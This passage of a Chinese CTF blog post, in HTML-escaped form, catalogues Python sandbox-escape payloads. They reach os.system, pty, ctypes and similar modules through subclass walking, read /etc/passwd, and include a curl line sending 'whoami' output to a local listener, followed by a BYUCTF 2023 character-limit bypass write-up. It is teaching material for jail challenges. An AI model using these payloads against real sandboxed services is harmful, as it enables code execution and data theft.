class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# help&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_GeneratorContextManagerBase&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;help&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;_wrap_close&amp;quot;&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;__builtins__&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sys&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt;].modules[&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;].system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;_sitebuiltins.&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;_Helper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;sys&amp;quot;&lt;/span&gt;].modules[&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;].system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#commands (not very common)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;commands&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;commands&amp;quot;&lt;/span&gt;].getoutput(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pty (not very common)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;pty&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;pty&amp;quot;&lt;/span&gt;].spawn(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#importlib&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt;].import_module(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt;].&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#imp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;imp.&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt;].import_module(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;imp.&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x) ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;importlib&amp;quot;&lt;/span&gt;].&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;os&amp;quot;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pdb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;pdb&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;pdb&amp;quot;&lt;/span&gt;].os.system(&lt;span class=&#34;string&#34;&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ctypes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;].&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ctypes&amp;#x27;&lt;/span&gt;).CDLL(&lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls /&amp;#x27;&lt;/span&gt;.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# multiprocessing&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[ x.__init__.__globals__ &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrapper&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x.__init__) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__init__.__globals__ ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;].&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;multiprocessing&amp;#x27;&lt;/span&gt;).Process(target=&lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: &lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).system(&lt;span class=&#34;string&#34;&gt;&amp;#x27;curl localhost:9999/?a=`whoami`&amp;#x27;&lt;/span&gt;)).start()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;file&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#file&#34;&gt;#&lt;/a&gt; File&lt;/h5&gt;
&lt;p&gt;操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[ x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;.__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x.__name__==&lt;span class=&#34;string&#34;&gt;&amp;quot;FileLoader&amp;quot;&lt;/span&gt; ][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].get_data(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;绕过长度限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过长度限制&#34;&gt;#&lt;/a&gt; 绕过长度限制&lt;/h3&gt;
&lt;p&gt;BYUCTF_2023 中的几道 jail 题对 payload 的长度作了限制&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;((&lt;span class=&#34;built_in&#34;&gt;__import__&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;re&amp;quot;&lt;/span&gt;).sub(&lt;span class=&#34;string&#34;&gt;r&amp;#x27;[a-z0-9]&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;code &amp;gt; &amp;quot;&lt;/span&gt;).lower()))[:&lt;span class=&#34;number&#34;&gt;130&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;题目限制不能出现数字字母，构造的目标是调用 open 函数进行读取&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;([&lt;span class=&#34;number&#34;&gt;102&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;108&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;97&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;103&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;46&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;120&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;])).read())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;函数名比较好绕过，直接使用 unicode。数字也可以使用 ord 来获取然后进行相减。我这里选择的是 chr (333).&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# f = 102 = 333-231 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;ç&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# a = 108 = 333-225 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;á&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# l = 97 = 333-236 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;ì&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# g = 103 = 333-230 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;æ&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# . = 46 = 333-287 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;ğ&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# t = 116 = 333-217 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;Ù&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# x = 120 = = 333-213 = ord(&amp;#x27;ō&amp;#x27;)-ord(&amp;#x27;Õ&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;([&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ç&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;á&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ì&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;æ&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ğ&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Ù&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Õ&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ō&amp;#x27;&lt;/span&gt;)-&lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Ù&amp;#x27;&lt;/span&gt;)])).read())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;但这样的话其实长度超出了限制。而题目的 eval 表示不支持分号；，这种情况下，我们可以添加一个 exec。然后将 ord 以及不变的  &lt;code&gt;a(&#39;ō&#39;)&lt;/code&gt;  进行替换。这样就可以构造一个满足条件的 payload&lt;/p&gt;
